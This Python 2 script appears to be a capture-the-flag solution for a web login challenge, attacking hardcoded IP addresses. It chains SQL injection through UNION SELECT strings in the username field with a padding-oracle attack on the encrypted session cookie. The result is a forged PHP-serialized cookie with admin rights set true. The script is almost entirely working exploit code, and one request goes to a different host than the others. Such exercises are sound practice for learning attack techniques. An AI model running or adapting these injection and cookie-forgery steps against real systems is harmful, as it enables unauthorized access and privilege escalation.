from Crypto.Util.number import *
import requests
import base64

def xor(a, b):
    return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])

def add_pad(s):
    block_len = 16
    pad_len = block_len - len(s)
    return s + chr(pad_len)*pad_len

def padding_oracle_attack(cipher, plain):
    after_dec = ""
    for k in range(1, 17):
        for i in range(0, 256):
            pad = xor(after_dec, chr(k)*(k-1))
            iv = "A"*16
            c = "A"*(16-k) + chr(i) + pad + cipher
            assert len(iv + c) == 48
            uname = "' UNION SELECT 'a', '%s" % (base64.b64encode(iv + c))
            url = "http://61.147.171.105:63767/"
            payload = payload = {"username":uname, "password":""}
            r = requests.post(url, data=payload)


            if r.text.find("Hello") < 0:
                after_dec = chr(i ^ k) + after_dec
                print after_dec.encode("hex")
                break

    assert len(after_dec) == 16            
    prev_cihper = xor(after_dec, plain)
    return prev_cihper


uname = "' UNION SELECT 'aaaaaaaaaaaaaaaaaaaaaaaaaa', 'hoge"
url = "http://61.147.171.105:63767/"
payload = payload = {"username":uname, "password":""}
r = requests.post(url, data=payload)

jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")

u = base64.b64decode(jsession)
j = u[:-16]
mac_j = u[-16:]

P = [j[i: i+16] for i in range(0, len(j), 16)]
C = [""]*5

P[4] = add_pad(P[4])
C[4] = mac_j

for i in reversed(range(1,5)):
    C[i-1] = padding_oracle_attack(C[i], P[i])


P[4] = add_pad("b:1;}")
P[2] = xor(xor(P[4], C[3]), C[1])

uname = "' UNION SELECT 'aaaaaaaaaa%s', 'hoge" % P[2]
url = "http://111.198.29.45:38257/"
payload = payload = {"username":uname, "password":""}
r = requests.post(url, data=payload)

jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")

u = base64.b64decode(jsession)
j = u[:-16]
mac_j = u[-16:]

P = [j[i: i+16] for i in range(0, len(j), 16)]
C = [""]*5

P[4] = add_pad(P[4])
C[4] = mac_j

for i in reversed(range(3,5)):
    C[i-1] = padding_oracle_attack(C[i], P[i])

# C[2] = "3d469b651494c9a3289e00191a6bafb6".decode("hex")

jsession = base64.b64encode('a:2:{s:4:"name";s:26:"aaaaaaaaaaaaaaaaaaaaaaaaaa";s:7:"isadmin";b:1;}'+C[2])
url = "http://61.147.171.105:63767/"
header = {"Cookie":"JSESSION=%s" % jsession.replace("=","%3D")}
r = requests.post(url, headers=header)
print r.text